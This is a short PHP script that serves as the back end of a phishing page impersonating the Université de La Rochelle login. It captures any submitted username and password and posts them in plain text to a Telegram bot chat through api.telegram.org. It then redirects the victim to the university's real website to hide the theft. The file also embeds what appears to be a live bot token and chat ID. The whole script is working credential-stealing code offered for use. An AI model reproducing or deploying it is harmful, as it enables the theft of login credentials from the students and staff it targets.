<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if username and password are set
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Capture the username and password from the form
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        // Store the message in a variable
        $message = "Username: " . $username . ", Password: " . $password;
        
        // Your Telegram bot token (replace with your token)
        $botToken = "6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk";
        
        // Your chat ID (replace with your chat ID)
        $chatID = "1064643518";
        
        // Telegram API URL for sending messages
        $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
        
        // Data array to be sent to Telegram
        $data = [
            'chat_id' => $chatID,
            'text' => $message,
        ];
        
        // Use file_get_contents to make the request
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ],
        ];
        $context = stream_context_create($options);
        $result = file_get_contents($telegramApiUrl, false, $context);
        
        // Check for success
        if ($result === FALSE) { 
            /* Handle error */ 
            echo "There was an error sending the message to Telegram.";
        }
        
        HEADER("Location: https://www.univ-larochelle.fr");

        
    } else {
        echo 'Username or password not set.';
    }
} else {
    // Form not submitted
    echo 'Please login.';
}
?>
